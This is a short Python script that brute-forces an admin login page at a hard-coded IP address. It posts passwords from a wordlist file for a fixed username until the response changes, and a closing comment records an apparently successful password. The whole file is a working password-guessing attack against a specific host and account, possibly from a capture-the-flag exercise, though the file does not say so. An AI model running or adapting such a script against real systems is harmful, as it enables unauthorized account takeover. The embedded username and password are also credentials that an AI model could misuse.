# -*- coding:utf-8 -*-
import requests

url = "http://47.74.184.73:8873/Admin_Pockr_login/check_action"

with open('usual.txt') as f:
    plist = f.read().split('\r\n')
    # print plist
for pwd in plist:
    data = {"name":"sunzheyi", "password":pwd, "dosubmit":"Login"}
    res = requests.post(url, data=data)
    print pwd
    if "Login" not in res.content:
        print "[+]find:" + pwd
        break

# 1q2w3e